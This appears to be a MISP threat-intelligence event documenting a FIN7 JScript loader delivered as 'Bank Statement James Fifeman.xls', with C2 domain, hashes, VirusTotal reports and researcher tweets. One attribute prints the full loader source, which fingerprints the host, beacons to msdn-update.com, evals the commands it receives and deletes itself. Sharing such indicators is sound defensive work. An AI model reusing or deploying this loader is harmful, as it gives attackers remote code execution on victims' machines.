{
    "Event":{
        "threat_level_id":"3",
        "date":"2019-05-13",
        "published":true,
        "info":"OSINT - [Emering] FIN7 JScript Loader Malware",
        "publish_timestamp":"1563528143",
        "timestamp":"1563528133",
        "Tag":[
            {
                "name":"misp-galaxy:mitre-enterprise-attack-intrusion-set=\"FIN7\""
            },
            {
                "name":"misp-galaxy:mitre-enterprise-attack-intrusion-set=\"FIN7 - G0046\""
            },
            {
                "name":"misp-galaxy:mitre-intrusion-set=\"FIN7\""
            },
            {
                "name":"misp-galaxy:mitre-intrusion-set=\"FIN7 - G0046\""
            },
            {
                "name":"misp-galaxy:threat-actor=\"Anunak\""
            },
            {
                "name":"circl:incident-classification=\"malware\""
            },
            {
                "name":"osint:source-type=\"microblog-post\""
            },
            {
                "name":"tlp:white"
            }
        ],
        "Attribute":[
            {
                "category":"Network activity",
                "comment":"C2",
                "timestamp":"1557819376",
                "type":"domain",
                "value":"msdn-update.com",
                "to_ids":true
            },
            {
                "category":"Other",
                "comment":"2019-05-13-FIN7-JS-loader.vk.js",
                "timestamp":"1557820480",
                "type":"other",
                "value":"// Bank Statement James Fifeman.xls\r\n// C2: hxxps://msdn-update[.]com/\r\n// SHA-256: 1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1\r\n\r\nfunction anonymous() {\r\n    var zbegbiwhuhro = \"&id=\";\r\n    var ihebgysipc = \"fetch\";\r\n    var yfusrihyny = \"\";\r\n    var tindajrurke = \"get_image\";\r\n    var ytysqyprozlibx = \"string\";\r\n    var otocywviso = \"no\";\r\n    var otbybimollu = \"Unknown\";\r\n    var evaritpequx = \"Scripting.FileSystemObject\";\r\n    var yqpawymfikorh = \"_\";\r\n    var koficijojhi = \"/\";\r\n    var inoxhegzajw = \"action=get_command\";\r\n    var ihunuxfip = \"request\";\r\n    var edomsecejso = \"z\";\r\n    var lwilpotasvo = \"create_logo\";\r\n    var vimkiwono = \"string\";\r\n    var pidwagunit = \"%APPDATA%\";\r\n    var gqyxqohoftupi = \"winmgmts:root/CIMV2\";\r\n    var erzirolonje = \"create_image\";\r\n    var esajigfown = \"decrypt\";\r\n    var ewypetevhu = \"?request=page\";\r\n    var bgixmabefzaqnu = \"show_ico\";\r\n    var huzzakrowopvu = \"\";\r\n    var zexygrogy = \"\";\r\n    var iwpodhexzubc = \"images\";\r\n    var bbymyruztovpi = \"WScript.Shell\";\r\n    var xaprislyhbulf = \"show_jpg\";\r\n    var inbypzethezag = \"&\";\r\n    var ucmomadgib = \"request\";\r\n    var vjiwumhojarse = \"group=zsoc._1305&rt=0&secret=fghedf43dsSFvm03&time=120000&uid=\";\r\n    var cedlihrijalti = \"?request=content&id=\";\r\n    var kyppaltuwti = \"image\";\r\n    var ejogamygpu = \"MSXML2.ServerXMLHTTP\";\r\n    var cylofalpitx = \"content\";\r\n    var fifuwacdez = \"encrypt\";\r\n    var atkudecaxme = \"decrypt\";\r\n    var obawufdoxsa = \"\";\r\n    var bhomnismictu = \"encrypt\";\r\n    var ocsekeltan = \"show_png\";\r\n    var vivijsozvali = \"User-Agent\";\r\n    var yracypcamos = \"no\";\r\n    var kexerobi = \"cdn\";\r\n    var inamvagtixjyxj = \"POST\";\r\n    var usubhejreva = \"_\";\r\n    var jaxylibpafl = \"\";\r\n    var hbanamyklujt = \"\";\r\n    var bvaxoqwetmodg = \"agyjabam=\";\r\n    var ditevnaqa = \"https://msdn-update.com/\";\r\n    var wegmexxabha = \"POST\";\r\n    var dnanehmufride = \"encrypt\";\r\n    var fypalygos = \"application/x-www-form-urlencoded\";\r\n    var urmuqizemz = \"Content-Type\";\r\n\r\n    function id() {\r\n        var lrequest = wmi.ExecQuery(\"select * from Win32_NetworkAdapterConfiguration where ipenabled = true\");\r\n        var lItems = new Enumerator(lrequest);\r\n        for (; !lItems.atEnd(); lItems.moveNext()) {\r\n            var mac = lItems.item().macaddress;\r\n            var dns_hostname = lItems.item().DNSHostName;\r\n            if (typeof mac === vimkiwono && mac.length > 1) {\r\n                if (typeof dns_hostname !== vimkiwono && dns_hostname.length < 1) {\r\n                    dns_hostname = otbybimollu;\r\n                } else {\r\n                    for (var i = 0; i < dns_hostname.length; i++) {\r\n                        if (dns_hostname.charAt(i) > edomsecejso) {\r\n                            dns_hostname = dns_hostname.substr(0, i) + yqpawymfikorh + dns_hostname.substr(i + 1);\r\n                        }\r\n                    }\r\n                }\r\n                return mac + yqpawymfikorh + dns_hostname;\r\n            }\r\n        }\r\n    }\r\n\r\n    function crypt_controller(type, request) {\r\n        var encryption_key = obawufdoxsa;\r\n        if (type === esajigfown) {\r\n            request = unescape(request);\r\n            var request_split = request.split(\")*(\");\r\n            request = request_split[0];\r\n            encryption_key = request_split[1].split(obawufdoxsa);\r\n        } else {\r\n            encryption_key = (Math.floor(Math.random() * 9000) + 1000).toString().split(obawufdoxsa);\r\n            request = unescape(encodeURIComponent(request));\r\n        }\r\n        var output = new Array(request.length);\r\n        for (var i = 0; i < request.length; i++) {\r\n            var charCode = request.charCodeAt(i) ^ encryption_key[i % encryption_key.length].charCodeAt(0);\r\n            output[i] = String.fromCharCode(charCode);\r\n        }\r\n        var result_string = output.join(obawufdoxsa);\r\n        if (type === fifuwacdez) {\r\n            result_string = result_string + \")*(\" + encryption_key.join(obawufdoxsa);\r\n            result_string = escape(result_string);\r\n        }\r\n        return result_string;\r\n    }\r\n\r\n    function get_path() {\r\n        var pathes = [iwpodhexzubc, kyppaltuwti, cylofalpitx, ihebgysipc, kexerobi];\r\n        var files = [lwilpotasvo, tindajrurke, erzirolonje, bgixmabefzaqnu, ocsekeltan, xaprislyhbulf];\r\n        var path = pathes[Math.floor(Math.random() * pathes.length)] + koficijojhi + files[Math.floor(Math.random() * files.length)];\r\n        return ditevnaqa + path;\r\n    }\r\n\r\n    function send_data(type, data, crypt) {\r\n        try {\r\n            var http_object = new ActiveXObject(ejogamygpu);\r\n            if (type === ucmomadgib) {\r\n                http_object.open(inamvagtixjyxj, get_path() + ewypetevhu, false);\r\n                data = bvaxoqwetmodg + crypt_controller(fifuwacdez, vjiwumhojarse + uniq_id + zbegbiwhuhro + id() + inbypzethezag + data);\r\n            } else {\r\n                http_object.open(inamvagtixjyxj, get_path() + cedlihrijalti + uniq_id, false);\r\n                if (crypt) {\r\n                    data = crypt_controller(fifuwacdez, data);\r\n                }\r\n            }\r\n            http_object.setRequestHeader(vivijsozvali, \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/50.0\");\r\n            http_object.setRequestHeader(urmuqizemz, fypalygos);\r\n            http_object.setOption(2, 13056);\r\n            http_object.send(data);\r\n            return http_object.responseText;\r\n        } catch (e) {\r\n            return otocywviso;\r\n        }\r\n    }\r\n\r\n    function main() {\r\n        var ncommand = obawufdoxsa;\r\n        ncommand = send_data(ucmomadgib, inoxhegzajw, true);\r\n        if (ncommand !== otocywviso) {\r\n            try {\r\n                eval(crypt_controller(esajigfown, ncommand));\r\n            } catch (e) {}\r\n        }\r\n        var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);\r\n        WScript.Sleep(random_knock);\r\n        main();\r\n    }\r\n    var first = false;\r\n    var shell = new ActiveXObject(bbymyruztovpi);\r\n    var fso = new ActiveXObject(evaritpequx);\r\n    var wmi = GetObject(gqyxqohoftupi);\r\n    var uniq_id = new Date().getUTCMilliseconds();\r\n    var app_path = shell.expandEnvironmentStrings(pidwagunit);\r\n    if (fso.GetFolder(app_path).Type.length > 5) {\r\n        fso.deleteFile(WScript.ScriptFullName);\r\n        try {\r\n            WScript.Sleep(120000);\r\n            main();\r\n        } catch (e) {\r\n            main();\r\n        }\r\n    }\r\n}",
                "to_ids":false
            },
            {
                "category":"Network activity",
                "comment":"C2",
                "timestamp":"1557823797",
                "type":"url",
                "value":"https://msdn-update.com/",
                "to_ids":true
            }
        ],
        "Object":[
            {
                "comment":"",
                "description":"Microblog post like a Twitter tweet or a post on a Facebook wall.",
                "meta-category":"misc",
                "name":"microblog",
                "timestamp":"1557817476",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"text",
                        "value":"2019-05-13: [Emering] #FIN7 JScript Loader #Malware\r\nðŸ²\r\n\r\nsource: 'Bank Statement James Fifeman.xls'\r\ngroup: 'zsoc._1305' [May 13]\r\nðŸ›‘\r\nc2: 'msdn-update[.]com'\r\nðŸ”¦\r\nMove away from '-cdn' domains \r\nðŸ¤”\r\n\r\nh/t @malz_intel\r\n\r\nðŸ›¡ï¸\r\nPushed to their extracted JS loader GitHub -> \r\n(link: https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-05-13-FIN7-JS-loader.vk.js) github.com/k-vitali/Malwaâ€¦",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"text",
                        "value":"Twitter",
                        "to_ids":false
                    },
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"url",
                        "value":"https://twitter.com/VK_Intel/status/1128079463785349121",
                        "to_ids":true
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"text",
                        "value":"@malz_intel",
                        "to_ids":false
                    },
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"url",
                        "value":"https://t.co/BaCFsrePJR?amp=1",
                        "to_ids":true
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557817476",
                        "type":"url",
                        "value":"https://github.com/k-vitali/Malware-Misc-RE/blob/master/2019-05-13-FIN7-JS-loader.vk.js",
                        "to_ids":true
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557817477",
                        "type":"datetime",
                        "value":"2019-05-14T01:27:00",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557817477",
                        "type":"text",
                        "value":"VK_Intel",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"File object describing a file with meta-information",
                "meta-category":"file",
                "name":"file",
                "timestamp":"1557819654",
                "Attribute":[
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"filename",
                        "value":"Bank Statement James Fifeman.xls",
                        "to_ids":true
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"text",
                        "value":"Malicious",
                        "to_ids":false
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"sha256",
                        "value":"<sha256>",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"",
                "description":"File object describing a file with meta-information",
                "meta-category":"file",
                "name":"file",
                "timestamp":"1563528120",
                "Attribute":[
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"md5",
                        "value":"<md5>",
                        "to_ids":true
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"sha1",
                        "value":"<sha1>",
                        "to_ids":true
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"sha256",
                        "value":"<sha256>",
                        "to_ids":true
                    }
                ]
            },
            {
                "comment":"",
                "description":"VirusTotal report",
                "meta-category":"misc",
                "name":"virustotal-report",
                "timestamp":"1557822889",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"datetime",
                        "value":"2019-05-14T04:00:38",
                        "to_ids":false
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"link",
                        "value":"https://www.virustotal.com/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/analysis/1557806438/",
                        "to_ids":false
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"text",
                        "value":"11/60",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"Microblog post like a Twitter tweet or a post on a Facebook wall.",
                "meta-category":"misc",
                "name":"microblog",
                "timestamp":"1557835644",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"text",
                        "value":"@VK_Intel\r\n Moar #FIN7 (link: https://www.virustotal.com/#/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/detection) virustotal.com/#/file/1fe27e0â€¦\r\nCscript renamed to mswmex57.exe and run from Contacts directory. JavaScript from UserForm1 placed in querlog.txt just like old times. New C2 though: hxxps://msdn-update[.]com/",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"text",
                        "value":"Twitter",
                        "to_ids":false
                    },
                    {
                        "category":"Network activity",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"url",
                        "value":"https://twitter.com/malz_intel/status/1128058016471719936",
                        "to_ids":true
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"text",
                        "value":"@VK_Intel",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"datetime",
                        "value":"2019-05-14T00:02:00",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557835645",
                        "type":"text",
                        "value":"malz_intel",
                        "to_ids":false
                    }
                ]
            },
            {
                "comment":"",
                "description":"VirusTotal report",
                "meta-category":"misc",
                "name":"virustotal-report",
                "timestamp":"1563528121",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"datetime",
                        "value":"2019-06-12T04:39:43",
                        "to_ids":false
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"link",
                        "value":"https://www.virustotal.com/file/1fe27e0a84a5bd2e433360fd2da5b1cad8d142ca2acbf3e256f0c99d99cb57f1/analysis/1560314383/",
                        "to_ids":false
                    },
                    {
                        "category":"Payload delivery",
                        "comment":"",
                        "timestamp":"1557819654",
                        "type":"text",
                        "value":"30/59",
                        "to_ids":false
                    }
                ]
            }
        ]
    }
}